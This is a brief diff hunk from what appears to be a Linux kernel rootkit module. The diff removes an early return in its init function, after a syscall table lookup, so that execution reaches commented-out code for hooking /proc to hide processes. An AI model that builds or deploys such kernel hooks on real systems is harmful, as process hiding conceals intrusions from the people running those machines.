@@ -346,8 +346,6 @@ static int __init r0mod_init(void)
 
     DEBUG("Search Found: sct @ %lx\n", (unsigned long)sct);
 
-    return 0;
-
     /* Hook /proc for hiding processes */
     //proc_iterate = get_vfs_iterate("/proc");
     //hijack_start(proc_iterate, &n_proc_iterate);
